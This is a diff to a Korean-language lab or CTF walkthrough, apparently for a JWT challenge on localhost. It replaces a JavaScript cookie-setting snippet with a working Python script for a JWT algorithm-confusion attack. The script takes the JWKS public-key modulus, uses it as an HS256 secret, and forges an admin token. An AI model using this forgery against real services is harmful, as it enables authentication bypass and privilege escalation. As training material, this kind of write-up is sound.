@@ -52,19 +52,42 @@ JWT 토큰을 다음과 같이 조작합니다:
 2. **Payload 수정**: `{"user_id": 1, "username": "admin", "role": "admin"}`
 3. **Signature 생성**: 서버의 secret_key로 HMAC-SHA256 서명 생성
 
-### 4단계: 조작된 토큰 적용
-브라우저 개발자 도구에서 쿠키를 수정하거나, 다음과 같은 JavaScript를 실행:
+### 4단계: 공개키 획득 및 토큰 위조
+http://localhost:5000/.well-known/jwks.json 경로에서 JWT 공개키 획득
+아래 python 예시 코드로 JWT 토큰 위조
 
-```javascript
-// HS256 알고리즘 우회 공격
-const header = btoa(JSON.stringify({"alg": "HS256", "typ": "JWT"}));
-const payload = btoa(JSON.stringify({"user_id": 1, "username": "admin", "role": "admin"}));
-// 실제로는 서버의 secret_key로 HMAC-SHA256 서명을 생성해야 함
-const signature = generateHMACSignature(header + "." + payload, secretKey);
-const token = header + "." + payload + "." + signature;
+```python
+# JWT 알고리즘 혼동 공격용 토큰 생성
+import jwt
+import datetime
+import base64
 
-// 쿠키 설정
-document.cookie = "token=" + token;
+# 서버 공개키의 JWK "n" 값을 base64url 디코딩하여 HMAC key로 사용
+n_b64 = "..."  # jwks.json에서 n 값 복사
+rem = len(n_b64) % 4
+if rem > 0:
+    n_b64 += '=' * (4 - rem)
+hmac_key = base64.urlsafe_b64decode(n_b64.encode())
+
+# 관리자 권한이 있는 페이로드 구성
+payload = {
+    "user_id": 1,
+    "username": "admin",
+    "role": "admin",
+    "iat": datetime.datetime.utcnow(),
+    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=12)
+}
+
+# 헤더를 HS256으로 명시
+headers = {
+    "alg": "HS256",
+    "typ": "JWT"
+}
+
+# HMAC-SHA256으로 위조된 서명 생성
+token = jwt.encode(payload, hmac_key, algorithm="HS256", headers=headers)
+print(token)
+
 ```
 
 ### 5단계: Admin 권한 확인
